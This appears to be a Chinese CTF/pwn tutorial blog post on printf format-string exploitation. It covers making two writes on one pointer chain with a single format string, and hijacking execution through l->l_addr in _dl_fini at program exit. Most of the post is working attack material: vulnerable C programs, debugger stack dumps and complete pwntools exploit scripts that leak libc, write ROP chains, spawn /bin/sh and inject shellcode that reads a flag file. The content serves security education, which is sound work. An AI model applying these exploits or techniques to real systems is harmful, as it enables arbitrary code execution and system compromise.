---
title: printf格式化字符串新用法集合
id: 194
date: 2024-01-09 20:09:14
auther: yrl
cover: 
excerpt: 前言 通常遇到只有一次fmt机会的题目时会构造loop达到多次利用；但是当fmt在非栈上的时候，无法直接修改目标地址，就需要多次fmt机会去构造指针链来实现，通常至少为2次fmt机会；那么在只有一次机会的情况下就需要特殊处理来实现两次写入了 单fmt字符串构造多次写入 攻击效果 1.将格式字符串的单
permalink: /archives/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%89%B9%E6%80%A7-%E5%A4%9A%E6%AC%A1%E5%86%99%E5%85%A5
categories:
 - pwn-wp
 - fmt
 - pwn知识点
tags: 
 - fmt
---

# 前言

通常遇到只有一次fmt机会的题目时会构造loop达到多次利用；但是当fmt在非栈上的时候，无法直接修改目标地址，就需要多次fmt机会去构造指针链来实现，通常至少为2次fmt机会；那么在只有一次机会的情况下就需要特殊处理来实现两次写入了

# 单fmt字符串构造多次写入

## 攻击效果

1.将格式字符串的单一用途转化为多种用途。

2.利用多个格式字符串在printf的返回地址下方写入一个目标地址，然后在最终的printf修改完成后，将printf的返回地址部分覆盖到某个retn位置。

## 攻击条件

1. 单次fmt机会
2. 已知或其他方式泄露出栈地址

## 攻击原则

先前说的格式化字符串通常是一次fmt实现泄露或者写入的功能，但是假如我们能够利用格式化字符串的机会有限，就会有利用单个fmt实现泄露+写入、或写入+写入（多次写入）的需求，那么在实践中证实，对于多个单指针（地址之间无重合）来说是可以进行多次写入的，但对于双重指针（非栈上的fmt）来说，一次实现目标地址的写入是不能生效的。

如下有一个双重指针：a -> b -> c -> d

如果我们试图在单个调用中使用双指针，首先修改b指向的值c，然后通过c修改d，则修改c的过程涉及使用`"n$"`，它对所有后续参数进行预处理。此时，我们随后将调用的指针c的内容也保存在args_value中。当通过c修改d时，指针c确实被修改了，但实际上，它是使用的c的副本，而这个c_copy是在修改c之前复制的。因此，当在这一点上进行修改时，实际修改的是c_copy所指向的值，从而产生一种修改失败的错觉。

现在我们知道是预处理阻止了第二次写入，所以我们需要找到一种绕过预处理的方法来启用第二次写。我现在能想到的方法是在第一次写入时不使用`"n$"`，然后在第二次写入时使用它。这允许第二次写入期间的预处理值成为第一次写入之后的修改值，从而在链上实现第二次写的效果。

通常，a的位置在b的位置之上，而a的位置相对靠近fmt参数，通常在第11个或第12个fmt参数处。我们可以使用像`%c`这样的类型向后查找参数，直到到达我们想要修改的位置，然后直接使用`%hn`将其修改到指针指向的地址。在第二次修改中，使用`n$`直接转到b的位置来修改c指针指向的内容（此时c指针指向第一次修改的返回地址）。然后，在第二次修改过程中，部分写入返回地址，以便在调用printf函数之前返回，最终实现多次利用的目标。

## 单次fmt写入能力测试

```c
//gcc fmt.c -o fmt -fpic -pie -z relro -z now
#include <stdio.h>
#include <unistd.h>
int main()
{
    unsigned char buf[0x100];
    read(0, buf, sizeof(buf));
    printf(buf);
    return 0;
}
```

1. `%p-%p`多次泄露
2. `%p-%1000c%43$hn`泄露加写入
3. `%p-%1000c%43$hn%20c%49$hn`不同偏移地址(不在同一条链上)可多次写入
4. `%p-%1000c%43$hn%20c%71$hn`不同偏移地址(在同一条链上)只生效第一个`n$`处的写入
5. `%c`*42+`%hhn%6c%71$hn`不同偏移地址(在同一条链上)可两次写入，使用多个`%c`代替第一个`n$`进行第一次写入，后面使用`n$`写入；修改的地址顺序如果是从低地址到高地址，可通过`%c`调整偏移实现多次写入,作用如3;

### 不同偏移地址(不在同一条链上)

格式化字符串为`%p-%1000c%43$hn%20c%49$hn`，写入前的栈：
```bash
24:0120│         0x7fffffffd920 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7e00000000
25:0128│         0x7fffffffd928 —▸ 0x7fffffffda08 —▸ 0x7fffffffdd86 ◂— 0x6e69772f746e6d2f ('/mnt/win')   <---pointer  offset=43
26:0130│         0x7fffffffd930 ◂— 0x100000000
27:0138│         0x7fffffffd938 —▸ 0x555555555189 (main) ◂— endbr64 
28:0140│         0x7fffffffd940 —▸ 0x5555555551f0 (__libc_csu_init) ◂— endbr64 
29:0148│         0x7fffffffd948 ◂— 0x55bc581e05b24043
2a:0150│         0x7fffffffd950 —▸ 0x5555555550a0 (_start) ◂— endbr64 
2b:0158│         0x7fffffffd958 —▸ 0x7fffffffda00 ◂— 0x1    <---pointer offset=49
2c:0160│         0x7fffffffd960 ◂— 0x0
2d:0168│         0x7fffffffd968 ◂— 0x0
```
写入后的栈：
```bash
24:0120│     0x7fffffffd920 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7e00000000
25:0128│     0x7fffffffd928 —▸ 0x7fffffffda08 —▸ 0x7fffffff03f7 ◂— 0x0
26:0130│     0x7fffffffd930 ◂— 0x100000000
27:0138│     0x7fffffffd938 —▸ 0x555555555189 (main) ◂— endbr64 
28:0140│     0x7fffffffd940 —▸ 0x5555555551f0 (__libc_csu_init) ◂— endbr64 
29:0148│     0x7fffffffd948 ◂— 0x55bc581e05b24043
2a:0150│     0x7fffffffd950 —▸ 0x5555555550a0 (_start) ◂— endbr64 
2b:0158│     0x7fffffffd958 —▸ 0x7fffffffda00 ◂— 0x40b
2c:0160│     0x7fffffffd960 ◂— 0x0
2d:0168│     0x7fffffffd968 ◂— 0x0
```
二级指针指向的内容已经被改变，可多次写入

### 不同偏移地址(在同一条链上)

格式化字符串为`%p-%1000c%43$hn%20c%71$hn`，写入前的栈：

```bash
24:0120│         0x7fffffffd920 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7e00000000
25:0128│         0x7fffffffd928 —▸ 0x7fffffffda08 —▸ 0x7fffffffdd86 ◂— 0x6e69772f746e6d2f ('/mnt/win')   <---pointer  offset=43
26:0130│         0x7fffffffd930 ◂— 0x100000000
27:0138│         0x7fffffffd938 —▸ 0x555555555189 (main) ◂— endbr64 
28:0140│         0x7fffffffd940 —▸ 0x5555555551f0 (__libc_csu_init) ◂— endbr64 
29:0148│         0x7fffffffd948 ◂— 0x55bc581e05b24043
2a:0150│         0x7fffffffd950 —▸ 0x5555555550a0 (_start) ◂— endbr64 
2b:0158│         0x7fffffffd958 —▸ 0x7fffffffda00 ◂— 0x1    <---pointer offset=49
2c:0160│         0x7fffffffd960 ◂— 0x0
2d:0168│         0x7fffffffd968 ◂— 0x0
```
写入后的栈：
```bash
24:0120│     0x7fffffffd920 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7e00000000
25:0128│     0x7fffffffd928 —▸ 0x7fffffffda08 —▸ 0x7fffffff03f7 ◂— 0x0
26:0130│     0x7fffffffd930 ◂— 0x100000000
... 
...
3f:01f8│     0x7fffffffd9f8 ◂— 0x1c
40:0200│ r13 0x7fffffffda00 ◂— 0x1
41:0208│     0x7fffffffda08 —▸ 0x7fffffff03f7 ◂— 0x0
```
可以发现，偏移为71的位置二级指针内容并没有并成功修改为0x40b，可见当需要修改的的指针在同一条链子上，不能全部通过`n$`来指定修改位置，否则只能生效第一次写入。

那如何实现用单次fmt机会实现两次写入呢？

既然多个`$n`只能生效第一个，那么我们用其他方式实现第一次修改，将`$n`放到最后一个即可。

根据fmt原理：fmt解释器会通过匹配`%`来解析其余参数，那我们可以通过构造`%c`来调整fmt偏移位置，一个`%`fmt偏移增加1，我们把格式化字符串修改为`%c`*42+`%hhn%6c%71$hn`，

修改后的栈：

```bash
24:0120│     0x7fffffffd920 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7e00000000
25:0128│     0x7fffffffd928 —▸ 0x7fffffffda08 —▸ 0x7fffffffdd2a ◂— 0x1f000000000030 /* '0' */
26:0130│     0x7fffffffd930 ◂— 0x100000000
... 
...
3f:01f8│     0x7fffffffd9f8 ◂— 0x1c
40:0200│ r13 0x7fffffffda00 ◂— 0x1
41:0208│     0x7fffffffda08 —▸ 0x7fffffffdd2a ◂— 0x1f000000000030 /* '0' */
```

可以发现0x7fffffffda08已经被改成了0x2a+6=0x30了，说明修改生效，至此可以通过单次fmt实现一条链上的指针的两次写入，可以完成对目标地址的修改需求

总结：一条fmt链上（二级指针）不能同时对链上的指针先后写入，若存在只会生效第一次写入。

## 示例例题

### 示例源码

```c
//gcc fmt1.c -o fmt1 -fpic -pie -z relro -z now -g
#include <stdio.h>
#include <unistd.h>
unsigned char buf[0x100];
void bk(){execve("/bin/sh",NULL,NULL);}
void main()
{
	int gift;
	setbuf(stdin, 0LL);
	setbuf(stdout, 0LL);
	setbuf(stderr, 0LL);
	printf("Gift: %x\n", (unsigned int)((unsigned long long)&gift & 0xFFFF));
	read(0, buf, sizeof(buf));
	printf(buf);
	_exit(0);
}
```
我们的目标：修改程序返回地址为bk的地址，拿到shell

思路：按照上述的单fmt两次写入，实现将printf返回地址改为bk地址

步骤：

1. 泄露程序基地址，并返回main，构造loop
2. 单次fmt写入，实现修改fmt返回地址为bk
3. 拿到shell

### exp

```python
from pwn import *
import sys
context.log_level = "debug"
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
def fmt(sh, data):
    data = data.ljust(0x100, '\x00')
    sh.send(data)

main = 0x64 # close canary
main = 0x7a # open canary
sh = process('./fmt1')
# sh = remote(sys.argv[1], 9999)
sh.recvuntil('Gift: ')
stack_ret = int(sh.recvline(), 16) - 0xC
log.success("stack_ret:\t" + hex(stack_ret))

first = "%c" * 9
first += "%{}c%hn%13$p".format((stack_ret-9) & 0xFFFF)
first += "%{}c%39$hhn".format((main - stack_ret - 14) & 0xFF)
# gdb.attach(sh)
# pause()
fmt(sh, first)
sh.recvuntil('0x')
bk_addr = int(sh.recv(12),16)
bk_addr = bk_addr - 0x19 # closue canary
bk_addr = bk_addr - 0x2f # open canary
log.success("process:\t" + hex(bk_addr))

second = '%{}c%39$hn'.format(bk_addr & 0xFFFF)
fmt(sh,second)
sh.interactive()

```

## 课后例题

### 例题源码

```c
//gcc fmt.c -o fmt -fpic -pie -z relro -z now
#include <stdio.h>
#include <unistd.h>
unsigned char buf[0x100];
int main()
{
	int ppointer;
	setbuf(stdin, 0LL);
	setbuf(stdout, 0LL);
	setbuf(stderr, 0LL);
	printf("pointer out: %x\n", (unsigned int)((unsigned long long)&ppointer & 0xFFFF));
	read(0, buf, sizeof(buf));
	printf(buf);
	_exit(0); // 避免修改main返回地址
	return 0;
}
```
### 步骤

1. 构造二级指针并返回main
2. 泄露libc并返回main
3. 向栈内写入ROP链子并返回main(两字节多次写入)
4. 修改printf返回地址返回到ROP链子

### exp

```python
from pwn import *
context.log_level = "debug"
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
def fmt(sh, data):
    data = data.ljust(0x100, '\x00')
    sh.send(data)


def write_data(sh, atk_addr, write_data):
    def build(x):
        if x == 0:
            return ""
        return "%{}c".format(x)

    for target_addr in range(atk_addr, atk_addr + len(write_data), 2):
        idx = target_addr - atk_addr
        part_data = u16(write_data[idx: idx + 2])

        payload = "%{}c".format(main) + "%39$hhn"
        payload += build((target_addr + 0x10000 - main) & 0xFFFF) + "%27$hn"
        fmt(sh, payload)

        payload = "%{}c".format(main) + "%39$hhn"
        payload += build((part_data + 0x10000 - main) & 0xFFFF) + "%41$hn"
        fmt(sh, payload)

main = 0x23
retn = 0xC4
# sh = process('./fmt')
sh = remote('127.0.0.1', 9999)
sh.recvuntil('out: ')
stack_ret = int(sh.recvline(), 16) - 0xC
log.success("stack_ret:\t" + hex(stack_ret))

first = "%c" * 9
first += "%{}c%hn".format((stack_ret-9) & 0xFFFF)
first += "%{}c%39$hhn".format((main - stack_ret) & 0xFF)
# gdb.attach(sh)
# pause()
fmt(sh, first)
# sh.interactive()

fmt(sh, "%{}c%39$hhn%9$p%11$p\n".format(main & 0xFF))
sh.recvuntil('0x')
libc_base = int(sh.recvuntil('0x', drop=True), 16) - 0x24083
log.success("libc_base:\t" + hex(libc_base))
stack = int(sh.recvline(), 16)
log.success("stack:\t" + hex(stack))
stack_rop = stack - 0x108
pop_rdi_addr = libc_base + 0x23b6a
bin_sh_addr = libc_base + 0x1b45bd
system_addr = libc_base + 0x52290
write_data(sh, stack_rop, p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr))
fmt(sh, "%{}c".format(retn) + "%39$hhn")
sh.interactive()

```

## fmt + 劫持l->l_addr

程序在退出时或调用exit函数时，exit退出流程会调用_dl_fini，其中会调用如下函数位置(glibc2.31)：
```c

void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
```
__run_exit_handlers中有这样调用：
```c

	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      cxafct (f->func.cxa.arg, status);
	      break;
	    }
```
cxafct (f->func.cxa.arg, status);中的cxafct看不到代码，在调试过程中可以得知他是_dl_fini，代码如下：
```c
		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr // <------ control it
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) (); // <--------- l->l_addr control array pointer
			}

		      /* Next try the old-style destructor.  */
		      if (l->l_info[DT_FINI] != NULL)
			DL_CALL_DT_FINI
			  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
		    }
```

array指针我们可以通过`l->l_addr`来控制，而`l->l_addr`是由栈中的一个偏移(_rtld_global的一个地址)和一个text段地址确定的，而栈中的这个偏移我们可以通过其他手段控制比如fmt写。


![image.png](/upload/image.png)

![image1.png](/upload/image1.png)

调试过程_dl_fini对应看不到源码，可以gdb调试这个过程，查看可控的部分，发现rsi就是我们能控制的，对应源码为`l->l_addr`

后续就可以通过`call   qword ptr [r14]          <0x4040b8>`来劫持程序执行流

利用条件：

1. 存在漏洞可以修改栈中_rtld_global指针的内容，如fmt
2. 程序存在return或exit
3. 程序需要关闭pie，开启pie的程序exit的时候r14不是text段地址

## 示例例题

### 题目源码

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void bk(){execve("/bin/sh",NULL,NULL);}
unsigned char buf[0x100];
int main()
{
    printf("input sth");
    read(0, buf, sizeof(buf));
    printf(buf);
    return 0;
}
// gcc fmt.c -o fmt -no-pie -z relro -z now -g
```

我们的目标：修改程序返回地址为bk的地址，拿到shell

思路：程序没开pie，通过fmt+_dl_fini劫持程序执行流到bk拿shell

步骤：

1. 通过fmt修改栈内_rtld_global指针的偏移指向bk
2. 拿shell

### exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from ctypes import *
context.log_level = 'debug'
def exp():
    context.terminal = ['tmux', 'splitw', '-h']

    payload = "%{}c%26$hn".format(0x2b8)
    payload = payload.ljust(0x40,'\x00')
    payload += p64(0x000000000040117e)
    print(len(payload))
    p.send(payload)
    p.interactive()
    
if __name__ == "__main__":
    binary = './fmt'
    elf = ELF('./fmt')
    context.binary = binary
    if(len(sys.argv) == 3):
        p = remote(sys.argv[1],sys.argv[2])
    else:
        p = process(binary)
    exp()

```

## 课后例题：pwn

```bash
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```
程序没开pie，其他都开了，ida看代码：
```c
__int64 sub_40135D()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  if ( mprotect((void *)((unsigned __int64)format & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7) )
    perror("mprotect");
  return sub_401236();
}

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  sub_40135D();
  puts("Welcome here!");
  puts("It's a simple sign-in question.");
  puts("Let's start!");
  close(1);
  read(0, format, 0x100uLL); <----- bss
  printf(format); <----- fmt
  return 0LL;
}
```

程序首先sub_40135D初始化，给bss段的format赋值777权限，可知可以在bss段部署shelcode，然后在输入之前close(1)，导致printf(format)泄露地址失效，并且只有一次格式化字符串的机会。

此时一次机会再不知道栈地址的情况下，很难去通过二级指针去修改printf的返回地址获得更多的利用机会，并且close(1)不能泄露libc，除非可以将stdout改为2，但是这里条件不允许；那我们转换思路，不管关没关输出流，程序总是要退出运行的，我们可以利用一次的fmt来控制exit过程中的array数组来劫持执行流，怎么控制？

在程序栈里存在指针`0x7ffcd288bb40 —▸ 0x7f99defe0190 ◂— 0x0`，他是一个偏移，这个指针会在exit退出过程中和text段地址结合成一个text段的指针，后续会被调用，这个过程是不需要泄露的，只需要我们在bss段布置好我们的shellcode，随后程序退出的时候劫持执行流到shelcode即可。

利用步骤：

1. 确认栈内_rtld_global指针的偏移，先通过fmt将_rtld_global指针指向的内容处写为特定偏移，它可以指向shellcode.
2. 在bss段写入shelcode
3. 程序exit触发shellcode调用

exp：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
from pwn import *
from ctypes import *
context.log_level = 'debug'
def exp():
    context.terminal = ['tmux', 'splitw', '-h']
    #context.log_level = "debug"
    # attach(p)
    p.recv()
    # attach(p)
    sc = shellcraft.open("./flag",0)
    sc += shellcraft.read(1,0x4040b0 + 0x100,0x100)
    sc += shellcraft.write(2,0x4040b0 + 0x100,0x100)
    # payload = p64(0x404060)
    payload = "%{}c%30$hn".format(0x308)
    payload = payload.ljust(0x40,'\x00')
    payload += p64(0x4040b8)
    payload += "\x90"*0x10
    payload += asm(sc)
    print(len(payload))
    p.send(payload)
    p.interactive()
if __name__ == "__main__":
    binary = './pwn'
    elf = ELF('./pwn')
    context.binary = binary
    libc = elf.libc
    if(len(sys.argv) == 3):
        p = remote(sys.argv[1],sys.argv[2])
    else:
        p = process(binary)
    exp()
```